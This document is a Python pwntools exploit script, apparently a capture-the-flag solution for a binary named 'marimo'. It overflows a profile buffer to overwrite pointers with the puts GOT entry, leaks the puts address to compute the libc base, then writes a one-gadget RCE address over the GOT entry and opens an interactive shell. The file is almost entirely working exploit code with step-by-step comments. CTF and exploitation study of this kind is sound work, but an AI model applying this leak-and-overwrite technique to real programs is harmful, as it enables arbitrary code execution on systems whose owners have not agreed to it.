from pwn import *
import time

#gdb.attach(proc, 'break') to attach gdb 


#import the binary and start it as a process
exe = context.binary = ELF('./marimo')
proc = process(context.binary.path)

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


class Marimo(object):

	def wait(self):
		#wait for menu
		proc.recvuntil('>> ')

	def AddMarimo(self, name, profile):
		self.wait()
		proc.sendline('show me the marimo')
		proc.sendlineafter('name?', name)
		proc.sendlineafter('profile.', profile)

	def ViewMarimo(self, index, modify=True):
		self.wait()
		proc.sendline('V')
		self.wait()
		proc.sendline(index)
		proc.recvuntil('[B]ack ?')
		
		if modify is True:
			proc.sendline('M')
		else:
			proc.sendline('B')

	def quit(self):
		self.wait()
		proc.sendline('Q')

# create instance of over-engineered object
m = Marimo()

# create the necessary objects in memory 
m.AddMarimo("marimo1", "profile_one")
m.AddMarimo("marimo2", "profile_two")

# necessary, for god knows what reason
# if it doesn't sleep it will only be able to transmit 32bytes into the buffer
# if it doesn't sleep more than 1 second it will only be able to transmit 48 bytes..
time.sleep(4)


# Open the modify option for the first marimo
m.ViewMarimo('0', True)


##################
# leak libc base #
##################

# 1. overwrite the pointer to the marimo name with the pointer to the got entry of puts
#      and overwrite the pointer to the profile to be the pointer to puts so we can later on
#      write to the got entry of puts with our own pointer to get it to execute
proc.sendlineafter('profile', ("A"*32 + "B" * 16 + "C" * 8 + p64(exe.got['puts']) + p64(exe.got['puts'])))

# 2. view marino2's profile to read out the addr of puts() in memory
proc.sendlineafter('>> ', "B")
proc.sendlineafter('>> ', "V")
proc.sendlineafter('>> ', "1")
puts_addr = u64(proc.recvline_startswith("name : ")[7:].ljust(8, '\x00'))

#3 subtract the address of puts, of the matching libc.so.6 version, from the address we just obtained
libc_puts_addr = libc.symbols['puts']
libc_base      = puts_addr - libc_puts_addr

print "libc_base: %X"%libc_base



###################################################
# overwrite entry in got with one-gadget-rce addr #
###################################################

# 1. calculate the one-gadget-RCE offset
libc_one_rce_addr = 0x4526a    #rsp + 0x30 == 0
one_rce_addr      = libc_base + libc_one_rce_addr

# 2. overwrite the puts() got entry through marimo2's profile
proc.sendlineafter('>> ', "B")
proc.sendlineafter('>> ', "V")
proc.sendlineafter('>> ', "1")
proc.sendlineafter('>> ', "M")
proc.sendlineafter('>> ', p64(one_rce_addr))

# 3. gain control
proc.interactive()


# https://github.com/Gallopsled/pwntools-write-ups/blob/master/2016/defcon_quals/heapfun/win.py